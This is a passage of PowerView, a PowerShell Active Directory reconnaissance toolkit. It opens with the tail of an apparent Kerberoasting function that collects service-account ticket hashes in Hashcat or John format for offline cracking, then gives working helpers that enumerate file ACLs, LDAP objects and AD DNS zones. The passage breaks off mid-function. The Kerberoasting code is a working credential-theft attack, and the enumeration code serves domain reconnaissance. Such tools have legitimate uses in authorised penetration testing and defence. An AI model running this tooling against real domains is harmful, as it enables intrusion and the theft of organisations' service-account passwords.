[CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]\n        [String[]]\n        $Identity,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Switch]\n        $Tombstone,\n\n        [ValidateSet('John', 'Hashcat')]\n        [Alias('Format')]\n        [String]\n        $OutputFormat = 'Hashcat',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        $UserSearcherArguments = @{\n            'SPN' = $True\n            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'\n        }\n        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }\n        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }\n        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }\n        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }\n        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }\n\n        if ($PSBoundParameters['Credential']) {\n            $LogonToken = Invoke-UserImpersonation -Credential $Credential\n        }\n    }\n\n    PROCESS {\n        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }\n        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat\n    }\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Get-PathAcl {\n<#\n.SYNOPSIS\n\nEnumerates the ACL for a given file path.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertFrom-SID  \n\n.DESCRIPTION\n\nEnumerates the ACL for a specified file/folder path, and translates\nthe access rules for each entry into readable formats. If -Credential is passed,\nAdd-RemoteConnection/Remove-RemoteConnection is used to temporarily map the remote share.\n\n.PARAMETER Path\n\nSpecifies the local or remote path to enumerate the ACLs for.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target path.\n\n.EXAMPLE\n\nGet-PathAcl \"\\\\SERVER\\Share\\\"\n\nReturns ACLs for the given UNC share.\n\n.EXAMPLE\n\ngci .\\test.txt | Get-PathAcl\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm', $SecPassword)\nGet-PathAcl -Path \"\\\\SERVER\\Share\\\" -Credential $Cred\n\n.INPUTS\n\nString\n\nOne of more paths to enumerate ACLs for.\n\n.OUTPUTS\n\nPowerView.FileACL\n\nA custom object with the full path and associated ACL entries.\n\n.LINK\n\nhttps://support.microsoft.com/en-us/kb/305144\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.FileACL')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('FullName')]\n        [String[]]\n        $Path,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n\n        function Convert-FileRight {\n            # From Ansgar Wiechers at http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights\n            [CmdletBinding()]\n            Param(\n                [Int]\n                $FSR\n            )\n\n            $AccessMask = @{\n                [uint32]'0x80000000' = 'GenericRead'\n                [uint32]'0x40000000' = 'GenericWrite'\n                [uint32]'0x20000000' = 'GenericExecute'\n                [uint32]'0x10000000' = 'GenericAll'\n                [uint32]'0x02000000' = 'MaximumAllowed'\n                [uint32]'0x01000000' = 'AccessSystemSecurity'\n                [uint32]'0x00100000' = 'Synchronize'\n                [uint32]'0x00080000' = 'WriteOwner'\n                [uint32]'0x00040000' = 'WriteDAC'\n                [uint32]'0x00020000' = 'ReadControl'\n                [uint32]'0x00010000' = 'Delete'\n                [uint32]'0x00000100' = 'WriteAttributes'\n                [uint32]'0x00000080' = 'ReadAttributes'\n                [uint32]'0x00000040' = 'DeleteChild'\n                [uint32]'0x00000020' = 'Execute/Traverse'\n                [uint32]'0x00000010' = 'WriteExtendedAttributes'\n                [uint32]'0x00000008' = 'ReadExtendedAttributes'\n                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'\n                [uint32]'0x00000002' = 'WriteData/AddFile'\n                [uint32]'0x00000001' = 'ReadData/ListDirectory'\n            }\n\n            $SimplePermissions = @{\n                [uint32]'0x1f01ff' = 'FullControl'\n                [uint32]'0x0301bf' = 'Modify'\n                [uint32]'0x0200a9' = 'ReadAndExecute'\n                [uint32]'0x02019f' = 'ReadAndWrite'\n                [uint32]'0x020089' = 'Read'\n                [uint32]'0x000116' = 'Write'\n            }\n\n            $Permissions = @()\n\n            # get simple permission\n            $Permissions += $SimplePermissions.Keys | ForEach-Object {\n                              if (($FSR -band $_) -eq $_) {\n                                $SimplePermissions[$_]\n                                $FSR = $FSR -band (-not $_)\n                              }\n                            }\n\n            # get remaining extended permissions\n            $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }\n            ($Permissions | Where-Object {$_}) -join ','\n        }\n\n        $ConvertArguments = @{}\n        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }\n\n        $MappedComputers = @{}\n    }\n\n    PROCESS {\n        ForEach ($TargetPath in $Path) {\n            try {\n                if (($TargetPath -Match '\\\\\\\\.*\\\\.*') -and ($PSBoundParameters['Credential'])) {\n                    $HostComputer = (New-Object System.Uri($TargetPath)).Host\n                    if (-not $MappedComputers[$HostComputer]) {\n                        # map IPC$ to this computer if it's not already\n                        Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential\n                        $MappedComputers[$HostComputer] = $True\n                    }\n                }\n\n                $ACL = Get-Acl -Path $TargetPath\n\n                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {\n                    $SID = $_.IdentityReference.Value\n                    $Name = ConvertFrom-SID -ObjectSID $SID @ConvertArguments\n\n                    $Out = New-Object PSObject\n                    $Out | Add-Member Noteproperty 'Path' $TargetPath\n                    $Out | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)\n                    $Out | Add-Member Noteproperty 'IdentityReference' $Name\n                    $Out | Add-Member Noteproperty 'IdentitySID' $SID\n                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType\n                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')\n                    $Out\n                }\n            }\n            catch {\n                Write-Verbose \"[Get-PathAcl] error: $_\"\n            }\n        }\n    }\n\n    END {\n        # remove the IPC$ mappings\n        $MappedComputers.Keys | Remove-RemoteConnection\n    }\n}\n\n\nfunction Convert-LDAPProperty {\n<#\n.SYNOPSIS\n\nHelper that converts specific LDAP property result fields and outputs\na custom psobject.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.DESCRIPTION\n\nConverts a set of raw LDAP properties results from ADSI/LDAP searches\ninto a proper PSObject. Used by several of the Get-Domain* function.\n\n.PARAMETER Properties\n\nProperties object to extract out LDAP fields for display.\n\n.OUTPUTS\n\nSystem.Management.Automation.PSCustomObject\n\nA custom PSObject with LDAP hashtable properties translated.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('System.Management.Automation.PSCustomObject')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]\n        [ValidateNotNullOrEmpty()]\n        $Properties\n    )\n\n    $ObjectProperties = @{}\n\n    $Properties.PropertyNames | ForEach-Object {\n        if ($_ -ne 'adspath') {\n            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {\n                # convert all listed sids (i.e. if multiple are listed in sidHistory)\n                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }\n            }\n            elseif ($_ -eq 'grouptype') {\n                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum\n            }\n            elseif ($_ -eq 'samaccounttype') {\n                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum\n            }\n            elseif ($_ -eq 'objectguid') {\n                # convert the GUID to a string\n                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid\n            }\n            elseif ($_ -eq 'useraccountcontrol') {\n                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum\n            }\n            elseif ($_ -eq 'ntsecuritydescriptor') {\n                # $ObjectProperties[$_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0\n                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0\n                if ($Descriptor.Owner) {\n                    $ObjectProperties['Owner'] = $Descriptor.Owner\n                }\n                if ($Descriptor.Group) {\n                    $ObjectProperties['Group'] = $Descriptor.Group\n                }\n                if ($Descriptor.DiscretionaryAcl) {\n                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl\n                }\n                if ($Descriptor.SystemAcl) {\n                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl\n                }\n            }\n            elseif ($_ -eq 'accountexpires') {\n                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {\n                    $ObjectProperties[$_] = \"NEVER\"\n                }\n                else {\n                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])\n                }\n            }\n            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {\n                # convert timestamps\n                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {\n                    # if we have a System.__ComObject\n                    $Temp = $Properties[$_][0]\n                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)\n                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)\n                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64](\"0x{0:x8}{1:x8}\" -f $High, $Low)))\n                }\n                else {\n                    # otherwise just a string\n                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))\n                }\n            }\n            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {\n                # try to convert misc com objects\n                $Prop = $Properties[$_]\n                try {\n                    $Temp = $Prop[$_][0]\n                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)\n                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)\n                    $ObjectProperties[$_] = [Int64](\"0x{0:x8}{1:x8}\" -f $High, $Low)\n                }\n                catch {\n                    Write-Verbose \"[Convert-LDAPProperty] error: $_\"\n                    $ObjectProperties[$_] = $Prop[$_]\n                }\n            }\n            elseif ($Properties[$_].count -eq 1) {\n                $ObjectProperties[$_] = $Properties[$_][0]\n            }\n            else {\n                $ObjectProperties[$_] = $Properties[$_]\n            }\n        }\n    }\n    try {\n        New-Object -TypeName PSObject -Property $ObjectProperties\n    }\n    catch {\n        Write-Warning \"[Convert-LDAPProperty] Error parsing LDAP properties : $_\"\n    }\n}\n\n\n########################################################\n#\n# Domain info functions below.\n#\n########################################################\n\nfunction Get-DomainSearcher {\n<#\n.SYNOPSIS\n\nHelper used by various functions that builds a custom AD searcher object.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-Domain  \n\n.DESCRIPTION\n\nTakes a given domain and a number of customizations and returns a\nSystem.DirectoryServices.DirectorySearcher object. This function is used\nheavily by other LDAP/ADSI searcher functions (Verb-Domain*).\n\n.PARAMETER Domain\n\nSpecifies the domain to use for the query, defaults to the current domain.\n\n.PARAMETER LDAPFilter\n\nSpecifies an LDAP query string that is used to filter Active Directory objects.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER SearchBase\n\nThe LDAP source to search through, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"\nUseful for OU queries.\n\n.PARAMETER SearchBasePrefix\n\nSpecifies a prefix for the LDAP search string (i.e. \"CN=Sites,CN=Configuration\").\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to for the search.\n\n.PARAMETER SearchScope\n\nSpecifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER SecurityMasks\n\nSpecifies an option for examining security information of a directory object.\nOne of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.\n\n.PARAMETER Tombstone\n\nSwitch. Specifies that the searcher should also return deleted/tombstoned objects.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainSearcher -Domain testlab.local\n\nReturn a searcher for all objects in testlab.local.\n\n.EXAMPLE\n\nGet-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'\n\nReturn a searcher for user objects in testlab.local and only return the SamAccountName and LastLogon properties.\n\n.EXAMPLE\n\nGet-DomainSearcher -SearchBase \"LDAP://OU=secret,DC=testlab,DC=local\"\n\nReturn a searcher that searches through the specific ADS/LDAP search base (i.e. OU).\n\n.OUTPUTS\n\nSystem.DirectoryServices.DirectorySearcher\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('System.DirectoryServices.DirectorySearcher')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(ValueFromPipeline = $True)]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('Filter')]\n        [String]\n        $LDAPFilter,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('ADSPath')]\n        [String]\n        $SearchBase,\n\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $SearchBasePrefix,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateSet('Base', 'OneLevel', 'Subtree')]\n        [String]\n        $SearchScope = 'Subtree',\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit = 120,\n\n        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]\n        [String]\n        $SecurityMasks,\n\n        [Switch]\n        $Tombstone,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        if ($PSBoundParameters['Domain']) {\n            $TargetDomain = $Domain\n\n            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {\n                # see if we can grab the user DNS logon domain from environment variables\n                $UserDomain = $ENV:USERDNSDOMAIN\n                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {\n                    $BindServer = \"$($ENV:LOGONSERVER -replace '\\\\','').$UserDomain\"\n                }\n            }\n        }\n        elseif ($PSBoundParameters['Credential']) {\n            # if not -Domain is specified, but -Credential is, try to retrieve the current domain name with Get-Domain\n            $DomainObject = Get-Domain -Credential $Credential\n            $BindServer = ($DomainObject.PdcRoleOwner).Name\n            $TargetDomain = $DomainObject.Name\n        }\n        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {\n            # see if we can grab the user DNS logon domain from environment variables\n            $TargetDomain = $ENV:USERDNSDOMAIN\n            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {\n                $BindServer = \"$($ENV:LOGONSERVER -replace '\\\\','').$TargetDomain\"\n            }\n        }\n        else {\n            # otherwise, resort to Get-Domain to retrieve the current domain object\n            write-verbose \"get-domain\"\n            $DomainObject = Get-Domain\n            $BindServer = ($DomainObject.PdcRoleOwner).Name\n            $TargetDomain = $DomainObject.Name\n        }\n\n        if ($PSBoundParameters['Server']) {\n            # if there's not a specified server to bind to, try to pull a logon server from ENV variables\n            $BindServer = $Server\n        }\n\n        $SearchString = 'LDAP://'\n\n        if ($BindServer -and ($BindServer.Trim() -ne '')) {\n            $SearchString += $BindServer\n            if ($TargetDomain) {\n                $SearchString += '/'\n            }\n        }\n\n        if ($PSBoundParameters['SearchBasePrefix']) {\n            $SearchString += $SearchBasePrefix + ','\n        }\n\n        if ($PSBoundParameters['SearchBase']) {\n            if ($SearchBase -Match '^GC://') {\n                # if we're searching the global catalog, get the path in the right format\n                $DN = $SearchBase.ToUpper().Trim('/')\n                $SearchString = ''\n            }\n            else {\n                if ($SearchBase -match '^LDAP://') {\n                    if ($SearchBase -match \"LDAP://.+/.+\") {\n                        $SearchString = ''\n                        $DN = $SearchBase\n                    }\n                    else {\n                        $DN = $SearchBase.SubString(7)\n                    }\n                }\n                else {\n                    $DN = $SearchBase\n                }\n            }\n        }\n        else {\n            # transform the target domain name into a distinguishedName if an ADS search base is not specified\n            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {\n                $DN = \"DC=$($TargetDomain.Replace('.', ',DC='))\"\n            }\n        }\n\n        $SearchString += $DN\n        Write-Verbose \"[Get-DomainSearcher] search base: $SearchString\"\n\n        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {\n            Write-Verbose \"[Get-DomainSearcher] Using alternate credentials for LDAP connection\"\n            # bind to the inital search object using alternate credentials\n            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)\n            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)\n        }\n        else {\n            # bind to the inital object using the current credentials\n            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)\n        }\n\n        $Searcher.PageSize = $ResultPageSize\n        $Searcher.SearchScope = $SearchScope\n        $Searcher.CacheResults = $False\n        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All\n\n        if ($PSBoundParameters['ServerTimeLimit']) {\n            $Searcher.ServerTimeLimit = $ServerTimeLimit\n        }\n\n        if ($PSBoundParameters['Tombstone']) {\n            $Searcher.Tombstone = $True\n        }\n\n        if ($PSBoundParameters['LDAPFilter']) {\n            $Searcher.filter = $LDAPFilter\n        }\n\n        if ($PSBoundParameters['SecurityMasks']) {\n            $Searcher.SecurityMasks = Switch ($SecurityMasks) {\n                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }\n                'Group' { [System.DirectoryServices.SecurityMasks]::Group }\n                'None' { [System.DirectoryServices.SecurityMasks]::None }\n                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }\n                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }\n            }\n        }\n\n        if ($PSBoundParameters['Properties']) {\n            # handle an array of properties to load w/ the possibility of comma-separated strings\n            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }\n            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))\n        }\n\n        $Searcher\n    }\n}\n\n\nfunction Convert-DNSRecord {\n<#\n.SYNOPSIS\n\nHelpers that decodes a binary DNS record blob.\n\nAuthor: Michael B. Smith, Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: None  \n\n.DESCRIPTION\n\nDecodes a binary blob representing an Active Directory DNS entry.\nUsed by Get-DomainDNSRecord.\n\nAdapted/ported from Michael B. Smith's code at https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1\n\n.PARAMETER DNSRecord\n\nA byte array representing the DNS record.\n\n.OUTPUTS\n\nSystem.Management.Automation.PSCustomObject\n\nOutputs custom PSObjects with detailed information about the DNS record entry.\n\n.LINK\n\nhttps://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1\n#>\n\n    [OutputType('System.Management.Automation.PSCustomObject')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]\n        [Byte[]]\n        $DNSRecord\n    )\n\n    BEGIN {\n        function Get-Name {\n            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]\n            [CmdletBinding()]\n            Param(\n                [Byte[]]\n                $Raw\n            )\n\n            [Int]$Length = $Raw[0]\n            [Int]$Segments = $Raw[1]\n            [Int]$Index =  2\n            [String]$Name  = ''\n\n            while ($Segments-- -gt 0)\n            {\n                [Int]$SegmentLength = $Raw[$Index++]\n                while ($SegmentLength-- -gt 0) {\n                    $Name += [Char]$Raw[$Index++]\n                }\n                $Name += \".\"\n            }\n            $Name\n        }\n    }\n\n    PROCESS {\n        # $RDataLen = [BitConverter]::ToUInt16($DNSRecord, 0)\n        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)\n        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)\n\n        $TTLRaw = $DNSRecord[12..15]\n\n        # reverse for big endian\n        $Null = [array]::Reverse($TTLRaw)\n        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)\n\n        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)\n        if ($Age -ne 0) {\n            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()\n        }\n        else {\n            $TimeStamp = '[static]'\n        }\n\n        $DNSRecordObject = New-Object PSObject\n\n        if ($RDataType -eq 1) {\n            $IP = \"{0}.{1}.{2}.{3}\" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]\n            $Data = $IP\n            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'A'\n        }\n\n        elseif ($RDataType -eq 2) {\n            $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]\n            $Data = $NSName\n            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'NS'\n        }\n\n        elseif ($RDataType -eq 5) {\n            $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]\n            $Data = $Alias\n            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'CNAME'\n        }\n\n        elseif ($RDataType -eq 6) {\n            # TODO: how to implement properly? nested object?\n            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))\n            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'\n        }\n\n        elseif ($RDataType -eq 12) {\n            $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]\n            $Data = $Ptr\n            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'PTR'\n        }\n\n        elseif ($RDataType -eq 13) {\n            # TODO: how to implement properly? nested object?\n            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))\n            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'\n        }\n\n        elseif ($RDataType -eq 15) {\n            # TODO: how to implement properly? nested object?\n            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))\n            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'\n        }\n\n        elseif ($RDataType -eq 16) {\n            [string]$TXT  = ''\n            [int]$SegmentLength = $DNSRecord[24]\n            $Index = 25\n\n            while ($SegmentLength-- -gt 0) {\n                $TXT += [char]$DNSRecord[$index++]\n            }\n\n            $Data = $TXT\n            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'TXT'\n        }\n\n        elseif ($RDataType -eq 28) {\n            # TODO: how to implement properly? nested object?\n            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))\n            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'\n        }\n\n        elseif ($RDataType -eq 33) {\n            # TODO: how to implement properly? nested object?\n            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))\n            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'\n        }\n\n        else {\n            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))\n            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'UNKNOWN'\n        }\n\n        $DNSRecordObject | Add-Member Noteproperty 'UpdatedAtSerial' $UpdatedAtSerial\n        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL\n        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age\n        $DNSRecordObject | Add-Member Noteproperty 'TimeStamp' $TimeStamp\n        $DNSRecordObject | Add-Member Noteproperty 'Data' $Data\n        $DNSRecordObject\n    }\n}\n\n\nfunction Get-DomainDNSZone {\n<#\n.SYNOPSIS\n\nEnumerates the Active Directory DNS zones for a given domain.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Get-DomainSearcher, Convert-LDAPProperty  \n\n.PARAMETER Domain\n\nThe domain to query for zones, defaults to the current domain.\n\n.PARAMETER Server\n\nSpecifies an Active Directory server (domain controller) to bind to for the search.\n\n.PARAMETER Properties\n\nSpecifies the properties of the output object to retrieve from the server.\n\n.PARAMETER ResultPageSize\n\nSpecifies the PageSize to set for the LDAP searcher object.\n\n.PARAMETER ServerTimeLimit\n\nSpecifies the maximum amount of time the server spends searching. Default of 120 seconds.\n\n.PARAMETER FindOne\n\nOnly return one result object.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the target domain.\n\n.EXAMPLE\n\nGet-DomainDNSZone\n\nRetrieves the DNS zones for the current domain.\n\n.EXAMPLE\n\nGet-DomainDNSZone -Domain dev.testlab.local -Server primary.testlab.local\n\nRetrieves the DNS zones for the dev.testlab.local domain, binding to primary.testlab.local.\n\n.OUTPUTS\n\nPowerView.DNSZone\n\nOutputs custom PSObjects with detailed information about the DNS zone.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.DNSZone')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True)]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $Domain,\n\n        [ValidateNotNullOrEmpty()]\n        [Alias('DomainController')]\n        [String]\n        $Server,\n\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $Properties,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ResultPageSize = 200,\n\n        [ValidateRange(1, 10000)]\n        [Int]\n        $ServerTimeLimit,\n\n        [Alias('ReturnOne')]\n        [Switch]\n        $FindOne,\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    PROCESS {\n        $SearcherArguments = @{\n            'LDAPFilter' = '(objectClass=dnsZone)'\n        }\n        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }\n        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }\n        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }\n        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }\n        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }\n        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }\n        $DNSSearcher1 = Get-DomainSearcher @SearcherArguments\n\n        if ($DNSSearcher1) {\n            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher1.FindOne()  }\n            else { $Results = $DNSSearcher1.FindAll() }\n            